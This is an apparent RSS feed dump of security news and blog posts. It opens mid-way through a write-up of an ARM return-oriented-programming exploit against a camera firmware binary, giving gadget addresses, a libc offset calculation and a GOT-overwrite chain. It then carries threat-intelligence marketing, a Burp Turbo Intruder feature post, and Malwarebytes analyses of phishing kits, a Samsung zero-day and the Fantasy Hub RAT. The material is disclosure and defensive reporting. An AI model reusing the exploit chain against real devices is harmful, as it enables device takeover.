entry is at  which points to the actual address of  at  within libc.Let’s see how far apart that  (0x76ba86f0) and  (0x76bbb920) are.So that means that if we can add 0x13230 to the address at  we have the address of .Gadgets, Gadgets and more GadgetsNow to the tedious part. The only thing between the high-level plan and RCE was a bunch of gadgets, right? I initially tried tools such as  to find and automatically chain gadgets, but ARM assembly offers many different, often multi-instruction ways to perform simple operations, e.g. add to a register or move values between registers. Those tools handle obvious, straightforward gadgets well, but they struggle once the gadget sequences become more complex. So in the end I reverted to manually searching and chaining gadgets with .If no short, straightforward gadgets are available, you must resort to longer ones. Typically, the longer a gadget is, the more side effects it has, for example, overwriting registers or changing the stack pointer. The challenge is therefore to find gadgets that implement the required primitive while introducing only manageable side effects that later gadgets can correct.The most crucial gadget in my chain was the one to add two values, preferably fully controllable. This would let me add the calculated offset to the address at  to get the address of . While there were a couple of gadgets to add static values like 0x1 or 0x2 to a register, these didn’t seem very useful because either a loop would be required to call them many times or the chain would become too long to reach the desired value. So I tried to find gadgets that added values from two registers such as the following one.# 0x000228d8: add r6, fp, r6; ldrb sb, [ip, #1]; ldr sl, [ip, #2]; blx r3;
: Adds fp (r11) and r6, stores result in r6: Dereferences ip (r12) + 1 byte, stores result in sb (r9): Dereferences ip (r12) + 2 word, stores result in sl (r10)As you can see here side effects can also mean that certain registers have to contain certain values beforehand. In this case ip (r12) has to contain a valid address that can be dereferenced. If that’s not the case, the program will crash.So we have a gadget that allows us to add fp (r11) and r6. Ideally we want the address of  in r6 and the offset we calculated earlier in fp (r11) giving us the address of  in r6 as an output of the gadget. But how do we get the address of  into r6? The address of  is known so we need a gadget to dereference it to obtain the address of  within libc.To accomplish this, let’s have a look at this gadget:# 0x000190ac: ldr r6, [r3, #0x10]; ldr r3, [r2, #4]; blx r3;
: Dereferences (r3 + 0x10), stores result in r6: Dereferences (r2 + 0x4), stores result in r3Exactly what we need, but as you can tell this gadget needs some specific preparation beforehand. To continue the chain with  we need to make sure  results in the next gadget of the chain. But that should be doable.Last but not least we need a gadget to jump to the calculated address. Unfortunately I simply couldn’t find one. I also couldn’t find ways of moving the address into another register for which call gadgets would exist. So where to go from here? I recalled that the GOT of the target binary is actually writable. So what about writing it back to the GOT? If that works we could just call  which would then load the altered address from the GOT and jump to it.Let’s try, here’s another gadget:# 0x0002a3f8: str r0, [r4, #4]; pop {r4, r5, r6, pc};
: Dereferences (r4 + 0x4) and stores value of r0: Continues the chainThis gadget enables us to store a value in r0 at . Given that we find gadgets to move our calculated address into r0 and  into r4 this allows us to write the tampered address back to the GOT.So if we could make everything line up the plan would be:Dereference  entry and store it in r6Add the calculated offset to  to the register r6Write the register r6 back to the GOT -> Prepare function arguments for The path wasn’t as straightforward as this write-up might imply. I spent quite some time trying to mix and match gadgets and even exchanged the ones discussed above numerous times until I came up with the following chain. Let me walk you through it.The function epilogue of the vulnerable base64 function conveniently allows us to populate r4 to r11 before jumping to the first gadget. So in this case I added some values to r6, r9 and r11 for later use.As a first step of the chain, we do some preparations.What we do here is basically this:Note that we store  in r3 so the following gadget can dereference it into r6. As discussed before we have to make sure that r2 contains a stack pointer so the chain can continue with .As shown above  is overwritten at runtime, so we need to make sure there is some scratch space on the stack so everything adds up properly.When jumping to the gadget at 0x1cad0 the stack looks like this:The stack pointer still points at the AAAA value. So we continue with some readjustments of the stack pointer and preparations of the r3 register.Next up is the discussed gadget to add ’s address an the calculated offset. The offset was already put into fp (r11) at the very beginning of the chain. Register r6 also contains ’s real address read from the GOT by now.The ip register can be disregarded as it won’t be used later and conveniently contained an address that points to the stack. Since we’re just reading from it, it also doesn’t invoke any undesirable side effects.As a next step we have a gadget that moves r6 into r0. So we move the calculated address (= ) into r0. Also, we prepare the r4 register for the next step. To deal with the side effects of this gadget some more padding is added.Finally, we reach the gadget that writes our calculated  address back to the GOT.To our convenience it also allows us to write  to r6.From here there isn’t much left to do. We move the stack pointer into r0 (first argument) and then call r6 which we previously populated with the address of .Attentive readers might have noticed this is a 32-bit binary, so why not just brute-force the address of ? This was indeed possible because the address space for 32-bit systems is significantly less than for 64-bit therefore the number of possible locations of libc is also a lot smaller. I used this approach for the first version of the exploit which worked fine. However, while probing for the correct address the exploit keeps crashing the target binary. If we think about a red team scenario this approach would be very noisy and should therefore be avoided. That’s why I decided to work out a more reliable exploit.We’ve now walked the full path from firmware extraction and analysis, through vulnerability identification, and exploitation. I hope reading this was as enjoyable for you as the actual research was for me.All vulnerabilities discovered during this research were reported through a responsible-disclosure process. Thanks to INSTAR for their prompt response, they fixed the issues and released an update within a short period of time.

With state-sponsored attacks, cybercrime, and AI-powered threats on the rise, organizations are doubling down on threat intelligence as their secret weapon for proactive defense.The 2025 State of Threat Intelligence is Recorded Future’s third annual flagship research report designed to take the pulse of the cybersecurity industry. Incorporating data from 615 cybersecurity executives, managers, and practitioners, the report reveals enterprise organizations’ use cases, challenges, and future investment plans.By sharing what we’ve learned, we hope to help organizations make smarter decisions about their investments, vendor choices, and program maturity. And, it helps keep us grounded in the real challenges our customers face every day.Check out key themes and highlights, and then explore the report for full details.Threat intelligence usage and adoptionThe report reveals that, in 2025, enterprises increasingly trust and rely on threat intelligence to inform business-critical decisions. Not only do 43% use it to guide strategic investments and planning, but most also say it helps them make decisions related to purchasing, risk assessment, and resource allocation.Compared to 2024, a larger percentage of organizations now have full-time threat intelligence teams, and 89% pay at least one threat intelligence vendor. Find out about their top use cases, how frequently they use it, and the variety of teams across their organizations that actively consume the intelligence.Threat intelligence spending and success metricsData breaches involving a third party doubled from 2024 to 2025, so no surprise that our survey found that most enterprise organizations allocate substantial cybersecurity budgets to threat intelligence. Seventy-six percent invest $250k or more per year in external threat intelligence products (excluding services), and 14% spend more than $1 million per year.When asked about how they measure the ROI of threat intelligence, most said their organizations focus on speed and efficiency gains. See how they rank success metrics, from improved threat detection and response times to reduction in the number of incidents to cost savings from prevented incidents.Challenges with threat intelligence maturityThe survey found that threat intelligence maturity is improving year over year, with 49% of surveyed security professionals saying their maturity level is advanced. In other words, they have tools that combine outputs from multiple threat intelligence sources, a dedicated threat intelligence team, and automated workflows that integrate with most security activities including business risk assessment.As their organizations increase investment to grow their maturity, survey respondents told us they’re also experiencing challenges related to threat intelligence vendors. Almost half are frustrated by poor integration with their existing security tools, but issues ranging from vendor credibility and cost effectiveness also come into play. Explore the challenges your peers are facing on the journey to threat intelligence maturity.Future plans to strengthen threat intelligenceFinally, we asked respondents to tell us how they plan to improve their threat intelligence maturity and outcomes. Ninety-one percent said they plan to invest more in threat intelligence in 2026, and more than half expect moderate to significant changes to their threat intelligence needs in the next 12 months.Given that 81% said they plan to consolidate threat intelligence vendors, they should prioritize vendors that support the most critical capabilities across a number of use cases. See the top five capabilities our respondents prioritize in their day-to-day work.Find out where your organization stands in relation to your peersThe 2025 State of Threat Intelligence Report makes it clear: As threat intelligence delivers increasing strategic value, forward-thinking enterprises are boosting investment and evolving their use cases.Download the report to discover ideas and information that can help your organization succeed on its own maturity journey.]]></content:encoded></item><item><title>Threat Intelligence &amp; the C-Suite</title><link>https://www.recordedfuture.com/blog/ti-from-soc-to-c-suite</link><author></author><category>threatintel</category><enclosure url="https://www.recordedfuture.com/blog/media_1675c04e910df4130163445af824111e54bac26e2.png?width=1200&amp;format=pjpg&amp;optimize=medium" length="" type=""/><pubDate>Wed, 12 Nov 2025 00:00:00 +0000</pubDate><source url="https://www.recordedfuture.com/">Recorded Future</source><content:encoded><![CDATA[From Defensive Maneuvering to Proactive Decision-MakingThreat intelligence is undergoing fundamental changes in both the breadth of its capabilities and its applications. We are seeing threat intelligence evolve from a tactical defensive tool—where teams are bringing in indicators of compromise and trying to make informed decisions around known risks—to a more proactive and strategic tool. Increasingly, enterprises are using threat intelligence to determine areas of investment, security tool purchasing, which supply chain or third party vendors to work with, and even how they train their employees.Rather than looking at threat intelligence as a kind of routine reporting reserved for security teams, organizations are beginning to see its value in broader business decisionmaking. Today, threat intelligence is being used across the enterprise, informing decisions from the board and executive levels all the way down to day-to-day security operations.With our 2025 State of Threat Intelligence report finding that 83% of organizations now run full-time threat intelligence teams, and most use intelligence to guide daily or weekly operations, it’s clear that what once began as a tactical advantage has now become a strategic necessity.A Seat at the Boardroom Table: The Strategic Maturation of Threat IntelligenceThese changes constitute a true paradigm shift in today’s enterprise security operations. In relatively short order, threat intelligence has evolved from just another security tool to an essential source of information for business strategy. So, what fueled this change?Threat intelligence was once the domain of analysts hunched over indicators and dashboards. But as cyber risk began shaping balance sheets and brand value, intelligence moved beyond the SOC. Today, it informs everything from vulnerability management and incident response to compliance, insurance, and executive protection. The same datasets that once helped detect intrusions now guide procurement choices, risk modeling, and crisis communication plans.As a result, we are seeing threat intelligence used by more than just security teams. It is now being used by governance, risk & compliance (GRC) teams, fraud teams, physical security teams, marketing and communications teams, and perhaps most importantly, by executive leadership teams and board leadership.Modern threat intelligence shifts the narrative from “are we secure?” to “how much risk can we tolerate?” We're never going to reach zero risk. But with threat intelligence, we can ensure that we're operating at an acceptable level, where we can keep under control those things that would cause business disruption, competitive disadvantage, financial implications or regulatory failures.In our 2025 State of Threat Intelligence Report, Recorded Future found that nearly three-quarters (73%) of surveyed security professionals report using threat intelligence, along with 48% of Incident response teams, 47% of risk management teams, and 46% vulnerability management teams.This continued spread of threat intelligence across business functions signals a shift from threat intelligence as a tool for optimizing defensive posture to one for optimizing strategic integration and risk management.The Board’s New Dashboard: Threat Intelligence as a Business TranslatorAs the board’s appetite for timely, relevant risk insight grows, threat intelligence provides a vital bridge between technical data and strategic clarity. Boards are increasingly demanding information and briefings that translate adversarial behavior into plain-language impacts, such as:Threat Intelligence-informed presentations shaping risk committee agendasExecutive protection and brand monitoring as extensions of enterprise intelligenceThreat Intelligence-driven prioritization of cybersecurity budgets and third-party vettingWe can see these new applications play out in routine, yet vital, processes across the modern enterprise. Consider the following two scenarios and how they illustrate the ways in which threat intelligence is being used to determine executive and board-level decision-making:High-risk, high-impact threats (like ransomware campaigns or geopolitical disruption) trigger strategic investment in contingency planning and data redundancy, and/or decisions around where to do business.Persistent but lower-impact risks may inform tolerance thresholds or shape insurance coverage decisions.These examples demonstrate how intelligence enables boards to truly act on risk, not just acknowledge it. With these tools, organizations are now able to use threat intelligence to decide which businesses to work with, which technologies to bring on board, and whether or not the business can expand into new regions safely and effectively.Enterprises are increasing threat intelligence spend as security shifts from reactive defense to a holistic, intelligence-driven strategy. Modern intelligence helps detect attacks sooner, prioritize critical risks, and respond faster—strengthening vulnerability management, incident response, and board-level risk decisions. With ransomware, supply-chain attacks, and regulatory pressure on the rise, intelligence is now central to smarter, faster, and more effective enterprise-wide action.2025 State of Threat Intelligence ReportIntelligence as the Backbone of Enterprise Agility: How Threat Intelligence Keeps Orgs On Their ToesWhereas in the past, an organization might use threat intelligence to inform their security posture, today, threat intelligence is being used in a much more holistic way, directly powering overall enterprise adaptability, resilience, and governance outcomes.In today’s rapidly changing threat landscape—with the growth of advanced, AI-enabled threats, supply-chain attacks, and shifting global regulations—boards can no longer afford to rely on static risk models. And it is comprehensive, timely, and relevant threat intelligence that helps keep today’s models dynamic.The majority of organizations today use threat intelligence to guide business decisions related to purchasing, risk assessment, and resource allocation. In our 2025 State of Threat Intelligence Report, Recorded Future found that:Nearly two-thirds (65%) of surveyed security professionals say threat intelligence directly supports security technology purchasing decisions58% say it guides risk assessment for business initiatives53% say it supports incident response resource allocationWith all of these figures representing year-over-year increases, it’s safe to say that the majority of organizations have already adopted this more holistic view of threat intelligence. And for those that haven’t, all signs seem to suggest that they soon will. At the very least, we can say that they certainly ought to.Intelligence-Driven Governance Is Essential for Modern Risk ManagementThe widespread adoption of threat intelligence across operations (including board-level decision-making) marks a turning point in how organizations perceive risk and value intelligence. No longer confined to security operations, threat intelligence is now a cornerstone of enterprise governance—a means of continuously informing executive and board-level risk decisions with clarity and confidence.In both its capabilities and its applications, threat intelligence has evolved dramatically over recent years, maturing from a reactive tool to a foundation for informed risk decisionmaking across the enterprise. From the SOC team, to the C-suite, and all the way to the board, threat intelligence is being used to inform a wide range of critical business decisions. With this larger shift in security from a reactive defense to a holistic, intelligence-driven strategy engine, enterprises are expanding their understanding and use of threat intelligence and seeing meaningful benefits as a result.Interested in making modern threat intelligence a part of your board’s operations?

If you've ever used Burp Intruder or Turbo Intruder, you'll be familiar with the ritual of manually digging through thousands of responses by repeatedly sorting the table via length, status code, etc. I've developed an algorithm called HTTP Anomaly Rank which can efficiently pick out the most interesting responses for you.

HTTP Anomaly Rank is now integrated into Turbo Intruder and automatically places the most anomalous findings at the top of the results table without you needing to lift a finger.

We've also integrated this algorithm into Burp Suite's API in release 2025.10, so you can easily use it in your own tools. Since it can efficiently sift through massive result sets, it's particularly useful for anyone who wants to build AI based features.

In this post I'll explain how the algorithm works in depth but first, here's a quick demo:

HTTP Anomaly Rank evolved from the diffing logic I developed during my Backslash Powered Scanner: Automating Human Intuition research back in 2016. I built Backslash Powered Scanner to discover unknown injection vulnerability classes by recognising subtle differences in responses to payload pairs such as " vs ". Accurately diffing HTTP responses is a notoriously difficult problem as they're often very noisy, but I eventually found a reliable approach based on calculating a large number of response attributes (think status code, line count, exact byte sequence...), identifying which ones are stable, and using these for response comparison. This let me answer the question "Are the responses to these two payloads consistently different", and automate discovery of some really nice vulnerabilities. Check out the whitepaper and presentation for the full details.

HTTP Anomaly Rank scores every response based on how different it is from the others. First, it calculates a weight for every attribute based on how stable it is.

PayloadStatusContent-TypeWord-countCRC32administrator403text/html812d753916dadmin403text/html8125129f3bdsales503text/html97710639dbaccounting200text/html8123978f20fADMIN403text/html8119fa1cbc1root503text/html9727df2486test403text/html812e45449e7

For example, consider the response set above.

The algorithm then looks at every response, and assigns it a score based on how unique the attribute values seen on that response are, combined with how unique it is. In this example, ADMIN ends up with the highest score because it has a unique word-count.

This approach means it can detect and flag responses with tiny discrepancies, even when the overall response content is very noisy - check the video above for an example.

The score increases in accuracy as we collect more responses. The calculation is quite computationally heavy but the algorithmic complexity is O(N) so it scales well. In Turbo Intruder, I made the score only get calculated when the attack is completed to minimise wasted CPU cycles.

Part of my vision for Turbo Intruder is to require as few user clicks as possible. To help achieve this, it will now automatically sort the results table by the anomaly rank column when the attack completes. Hopefully this strategy works for you but if not, you can override it and automatically sort by any column of your choice using table.setSortOrder()

I'm looking forward to announcing some more quality of life updates for Turbo Intruder soon!

If you see the "Anomaly Rank" column but it's always set to 0, that means you need to update Burp Suite. This feature is available in 2025.10 and later.

Let me know how you find it, and if you'd like this feature in Burp Intruder too.

Enjoy!]]></content:encoded></item><item><title>Samsung zero-day lets attackers take over your phone</title><link>https://www.malwarebytes.com/blog/news/2025/11/patch-now-samsung-zero-day-lets-attackers-take-over-your-phone</link><author></author><category>threatintel</category><pubDate>Tue, 11 Nov 2025 14:28:04 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[So, for many cybersecurity professionals, CISA adding this vulnerability to the list signals both urgency and confirmation of active, real-world exploitation.CVE-2025-21042 was reportedly exploited as a remote code execution (RCE) zero-day to deploy LANDFALL spyware on Galaxy devices in the Middle East. But once that happens, other criminals tend to quickly follow with similar attacks.The flaw itself is an out-of-bounds write vulnerability in Samsung’s image processing library. These vulnerabilities let attackers overwrite memory beyond what is intended, often leading to memory corruption, unauthorized code execution, and, as in this case, device takeover. CVE-2025-21042 allows remote attackers to execute arbitrary code—potentially gaining complete control over the victim’s phone—without user interaction. No clicks required. No warning given.Samsung patched this issue in April 2025, but CISA’s recent warning highlights that exploits have been active in the wild for months, with attackers outpacing defenders in some cases. The stakes are high: data theft, surveillance, and compromised mobile devices being used as footholds for broader enterprise attacks.​The exploitation playbook is as clever as it is dangerous. According to research from Unit 42, criminals (likely private-sector offensive actors operating out of the Middle East) weaponized the vulnerability to deliver LANDFALL spyware through malformed Digital Negative (DNG) image files sent via WhatsApp. DNG is an open and lossless RAW image format developed by Adobe and used by digital photographers to store uncompressed sensor data.The attack chain works like this:The victim receives a booby-trapped DNG photo file.The file, armed with ZIP archive payloads and tailored exploit code, triggers the vulnerability in Samsung’s image codec library.This is a “zero-click” attack: the user doesn’t have to tap, open, or execute anything. Just processing the image is enough to compromise the device.It’s important to know that Samsung addressed another image-library flaw, CVE-2025-21043, in September 2025, showing a growing trend: image processing flaws are becoming a favorite entry point for both espionage and cybercrime.What should users and businesses do?Our advice to stay safe from this type of attack is simple:If you haven’t updated your Samsung device since April, do so. FCEB organizations have until December 1, 2025, to comply with CISA’s operational directive.Be wary of unsolicited messages and files, especially images received over messaging apps.Download apps only from trusted sources and avoid sideloading files.Zero-days targeting mobile devices are becoming frighteningly common, but the risk can be lowered with urgent patching, awareness, and solid security controls. As LANDFALL shows, the most dangerous attacks today are often the quietest—no user action required and no obvious signs until it’s too late.Device models targeted by LANDFALL:We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>NHS providers reviewing stolen Synnovis data published by cyber criminals</title><link>https://databreaches.net/2025/11/11/nhs-providers-reviewing-stolen-synnovis-data-published-by-cyber-criminals/?pk_campaign=feed&amp;pk_kwd=nhs-providers-reviewing-stolen-synnovis-data-published-by-cyber-criminals</link><author>Dissent</author><category>databreach</category><pubDate>Tue, 11 Nov 2025 14:03:24 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Gates Down: Third Circuit Says Breaking Employer Computer Access Policies Is Not Hacking</title><link>https://databreaches.net/2025/11/11/gates-down-third-circuit-says-breaking-employer-computer-access-policies-is-not-hacking/?pk_campaign=feed&amp;pk_kwd=gates-down-third-circuit-says-breaking-employer-computer-access-policies-is-not-hacking</link><author>Dissent</author><category>databreach</category><pubDate>Tue, 11 Nov 2025 14:02:16 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>How credentials get stolen in seconds, even with a script-kiddie-level phish</title><link>https://www.malwarebytes.com/blog/threat-intel/2025/11/how-credentials-get-stolen-in-seconds-even-with-a-script-kiddie-level-phish</link><author></author><category>threatintel</category><pubDate>Tue, 11 Nov 2025 13:17:43 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[This attempt to phish credentials caught our attention, mostly because of its front-end simplicity. Even though this is a script-kiddie-level type of attack, we figured it was worth writing up—precisely because it’s so easy to follow what they’re up to.The email is direct and to the point. Not a lot of social engineering happening here.Pls kindly find the attached PO please send us PI once its available.”The sender’s address belongs to a Czechoslovakian printing service (likely compromised), and the name and phone number are fake. The target is in Taiwan.The attached  file is a tidy fake login screen that doesn’t really specify which credentials they want:The pre-filled email address in the screenshot is a fake one I added; normally it would be the target’s email.We assume the phisher welcomes any credentials entered here, and are counting on the fact that most people reuse passwords on other sites. Under the hood, the functionality of this attachment lies in this piece of JavaScript.It starts with simple checks to make sure all the fields are filled out and long enough before declaring the Telegram bot that will receive the login details.Using Telegram bots provides the phishers with several advantages:Stolen credentials are delivered instantly to the attacker via Telegram notifications. No need for the phisher to keep checking a database or inbox.Telegram is a legitimate, globally distributed messaging service, making it difficult to block.There’s no exposed web server or obvious phishing “drop site” that can be blocklisted or shut down.The last line contains a credibility trick:setTimeout(() => {window.location.assign("file:///C:/Users/USER/Downloads/Invoice_FAC_0031.pdf")}, 2000);This tries to open a file on the user’s computer after waiting 2 seconds (2,000 milliseconds). Since this file almost certainly doesn’t exist, the browser will either block the action (especially from an email or non-local file) or show an error. Either way, it will make the login attempt look more legitimate and take the user’s mind off the fact that they just sent their credentials who knows where.That’s really all there is to it, except for a bit of code that the dungeon-dweller forgot to remove during their copy-and-paste coding. Or they had no idea what it was for and left it in place for fear of breaking something.I suspect the attacker originally used this code to encrypt the credentials with a hardcoded AES (Advanced Encryption Standard) key and injection vector, then send them to their server.This attacker replaced that method with the simpler Telegram bot approach (much easier to use), but left the decryption stub because they were afraid removing it would break something.Don’t fall for phishing attemptsEven though the sophistication level of this email was low, that does not reduce the possible impact of sending the attacker your credentials.In phishing attempts like these, two simple rules can save you from lots of trouble.Don’t open unsolicited attachmentsCheck if the website address in the browser matches the domain you expect to be on (e.g. adobe.com).Other important tips to stay safe from phishing in general:Verify the sender: Always check if the sender’s email address matches what you would expect it to be. It’s not always conclusive but it can help you spot some attempts.Check through an independent channel if the sender actually sent you an attachment or a link.Keep your device and all its software updated.Use multi-factor authentication for every account you can.Use a password manager. Password managers will not auto-fill a password to a fake site, even if it looks like the real deal to you.If you already entered credentials on a page you don’t trust, change your passwords immediately. You can also upload screenshots of suspicious emails to Malwarebytes Scam Guard. It would have recognized this one as a phishing attempt.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline.

Without your passcode, fingerprint or face to unlock it, it would be useless to anyone else. Now, though, some phone thieves have found a workaround, not by breaking Apple’s security, but by tricking owners into giving them the keys. The Swiss National Cyber Security Centre (NCSC) has issued a warning about phishing scams targeting iPhone owners who’ve lost their devices.Phishing for Apple ID credentialsWhen you report an iPhone as lost in Apple’s  app, you can set a custom lock-screen message that appears on the missing device. Many people include an email address or phone number in that message so a helpful stranger can contact them if the phone turns up.Unfortunately, that’s the very information scammers use to reach you. A thief (or anyone who now has the phone) can see that contact detail on the screen and send you a convincing message—usually by text, iMessage, or email—claiming to have found your device.The scam messages often include details copied from the phone itself, such as its model and color, to make it sound authentic. It also includes a link to a fake website that mimics the Find My service that Apple operates to locate lost devices. The site will ask for the victim’s Apple ID credentials.If the victim takes the bait, the thief can use those credentials to gain full access to the phone. That enables them to wipe it, returning it to factory settings for resale.Although the NCSC didn’t say so, an enterprising thief could get up to all kinds of other shenanigans. They might reset the user’s Apple ID to lock them out—even on a replacement device, access their photos (yes, including any risqué ones), read their emails and nose through their apps. In short, it would give them carte blanche to your digital life.These attacks don’t have to happen immediately. The perpetrators might text months after the device has been lost, when victims might have moved on and lowered their guard.The good news… and the badThe warning is both good and bad news. It’s good news because it shows that criminals are apparently unable to bypass Apple’s Activation Lock protection through technical means. The Activation Lock, turned on when you activate Find My, registers a device ID on Apple’s activation servers. Even if the criminals reset your device, the activation lock will still be there. Only someone with the user’s Apple ID credentials can unlock it. It’s a version of something called Factory Reset Protection (FRP) that the US mandated under the US Smart Phone Theft Prevention Act of 2015. Android phones have similar lock functionality.The warning is bad news because phone owners are human, and humans are often the easiest security system to defeat. Phishing schemes that target phone theft victims are big business. Back in 2017, security reporter Brian Krebs documented “phishing as a service” platforms that did it at scale, on a subscription basis. Vice found toolkits like ProKit for phishing to unlock phones on sale for around $75.We’ve already written about how the phone theft industry operates. Police in the UK recently uncovered a network stealing up to 40,000 phones per year. Most were shipped overseas to countries including China, where they would be used as profitably as possible. Locked phones might be broken up for parts, but a phone restored to factory settings that can be activated from scratch is far more valuable.What to do if your iPhone is stolenIgnore any messages from “Apple” claiming your lost phone has been found. The NCSC says Apple will never text or email customers about a recovered device.If you lose your phone,  right away in to lock it and display your contact message. Use a different contact number or email (not the one linked to your Apple ID or main phone) so scammers can’t use that information to target you.Protect your SIM, too: enable  immediately, and ask your carrier to  if the phone has been stolen.We can’t easily stop thieves stealing people’s phones, or control who sees our phones after they leave our hands. But a little forethought now can help you to stop criminals from accessing your digital life or selling your phone on in its current form if it does enter the underground supply chain.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline.

The incident may have led to the compromise of draft reports, economic forecasts, internal emails, and other confidential data. The attack has been attributed to the Chinese state-sponsored APT group known as Silk Typhoon.Hyundai AutoEver America was hit by a cyber attack that resulted in unauthorized access to its IT environment, exposing sensitive personal information, including names, Social Security Numbers, and driver’s license numbers. The attack, which occurred between February 22 and March 2, 2025, affected employees, customers, or users, although the exact number of affected individuals remains unclear.Swedish IT systems supplier Miljödata has suffered a data breach that resulted in the exposure and theft of personal data belonging to up to 1.5 million individuals, including names, email addresses, physical addresses, phone numbers, government IDs, and dates of birth. The incident disrupted operations across multiple Swedish municipalities, affecting both children and protected identity subjects. The stolen data was published on the dark web by the threat group Datacarry.Japanese media giant Nikkei has experienced a cyber-attack caused by malware infection. The attack resulted in unauthorized access to its Slack messaging platform, exposing the personal information of over 17,000 employees and business partners, including names, email addresses, and chat histories.Polish online loan platform SuperGrosz, operated by AIQLABS, has disclosed a breach exposing personal data of at least 10,000 customers, including names, addresses, ID and tax numbers, phone contacts, employment details, and bank account numbers. The disclosure follows a separate distributed denial-of-service (DDoS) attack on a Polish mobile payment leader Blik that disrupted instant transfers and cash withdrawals. No actor has claimed responsibility, though Polish authorities have suggested a possible Russian link to the Blik attack.SonicWall has confirmed that a state-sponsored threat actor was behind the September attack that resulted in the theft of all firewall configuration files stored in its cloud backup environment via an API call. The breach exposed encrypted credentials and device configuration data contained in those files, enabling potential targeted attacks. All customers who used the cloud backup service were affected.VULNERABILITIES AND PATCHESCheck Point Research has uncovered four critical vulnerabilities in Microsoft Teams that allow attackers to impersonate users, manipulate messages, notifications, displayed names and forge caller identities in video and audio calls. Microsoft fixed the flaws and officially tracked the notification spoofing flaw as CVE-2024-38197.Check Point Research detected an exploit that drained $128.64M from Balancer V2. The attacker combined a rounding error vulnerability in a certain function with carefully crafted batchSwap operations. It allowed the attacker to artificially suppress Balancer Pool Token prices and extract value through repeated arbitrage cyclesA critical remote command execution vulnerability, CVE-2025-48703, affecting CentOS Web Panel (CWP) versions prior to 0.9.8.1204 is actively being exploited in the wild It enables remote, unauthenticated attackers with knowledge of a valid username to execute arbitrary shell commands as that user. A patch addressing the issue was released in version 0.9.8.1205.Point IPS provides protection against this threat (CentOS Web Panel Command Injection (CVE-2025-48703))Cisco warns of a new attack variant targeting Secure Firewall ASA and FTD that exploits CVE-2025-20333 (RCE as root via crafted HTTP) and CVE-2025-20362 (unauthenticated restricted-URL access), causing unpatched devices to reload into DoS. Both flaws were previously abused as zero-days in late September to deliver RayInitiator and LINE VIPER malware.Point IPS provides protection against this threat (Cisco Multiple Products Buffer Overflow (CVE-2025-20333); Cisco Multiple Products Authentication Bypass (CVE-2025-20362))THREAT INTELLIGENCE REPORTSCheck Point Research demonstrated a new way to use ChatGPT for malware analysis directly from the web interface, analyzing XLoader malware. The workflow using exported IDA data enables static analysis, rapid decryption, IoC extraction, and hidden C2 discovery.Point Threat Emulation and Harmony Endpoint provide protection against this threat (Trojan.Wins.Xloader; Trojan.Win.Xloader; Trojan.Wins.Xloader.ta.*)Check Point discovered AI-driven pharma scams that deepfake doctors and clinics to sell counterfeit drugs.

Usually, it’s up to the buyer to spread the malware, but Fantasy Hub goes a step further—it comes with full documentation, video tutorials, and a subscription model that makes it easy for even inexperienced attackers to use. Its creators provide step-by-step guides to create fake Google Play pages that imitate apps like Telegram or online banking portals, complete with realistic reviews. It’s a Remote Access Trojan (RAT) that anyone can distribute.Distribution relies heavily on social engineering and phishing. Attackers use Fantasy Hub’s templates and tools to set up convincing fake app pages, tricking users into downloading the malicious software. A “dropper” option even lets buyers upload any Android app APK and get back a modified version with Fantasy Hub added.These counterfeit apps look legitimate, and often request only a single permission: SMS access. But that permission unlocks much more. The SMS handler role bundles multiple powerful permissions: contacts, camera, and file access into a single authorization step, unlocking extensive control over the device’s messaging, contacts, and camera functions. Fantasy Hub is designed to bypass standard security checks and can remain concealed, making detection difficult for users.Once installed, Fantasy Hub can steal SMS messages, call logs, contacts, photos, and videos. It can also intercept, reply to, and delete notifications. More dangerously, it can initiate live audio and video streams using the device’s camera and microphone without the user’s consent. It’s been found in imitation banking apps, displaying fake windows to harvest user credentials such as usernames, PINs, and passwords. As part of the handy pack provided by Fantasy Hub’s creators, attackers are given tools to tailor these phishing windows for almost any banking app they wish to target.While individuals at at risk from this malware, the threat extends to organizations that use Bring Your Own Device (BYOD) policies or rely on mobile banking and work apps. A single infected phone could expose company data or communications.Fantasy Hub shows how easily cybercriminals can now buy and run complex spyware. But a few simple habits can help you stay safe:Stick to trusted sources. Download apps only from Google Play, Apple’s App Store, or the official provider. Your bank will never ask you to use another source. Use an up-to-date real-time anti-malware solution like Malwarebytes for Android, which already detects this malware as Android/Trojan.Spy.ACRF949851CC4. Does it really need the permissions it’s requesting to do the job you want it to do? Especially if it asks for SMS or camera access.Unsolicited communications. Stay wary of messages, emails, or links urging you to “update” or install outside the official app stores.We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>⚡ Weekly Recap: Hyper-V Malware, Malicious AI Bots, RDP Exploits, WhatsApp Lockdown and More</title><link>https://thehackernews.com/2025/11/weekly-recap-hyper-v-malware-malicious.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihDn-ouAjSamS6qppMqJQp0muEjFRy3-Rs2m4u6iNunhDZUPSbi9CQMC1Ub8r7CFkHVo_7B98nwiZbsLlbg2Xq_Im67d6GvqaEaq3ZILZfZVhYafqJydsDCggwkh_n3q-XDcZJ_JLFalQ7E_KK-nYa9_YrOZl62NnyglLa5vmtdWPF7K9lH07l32yv72CI/s1600/recap-nov.jpg" length="" type=""/><pubDate>Mon, 10 Nov 2025 12:51:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cyber threats didn’t slow down last week—and attackers are getting smarter.

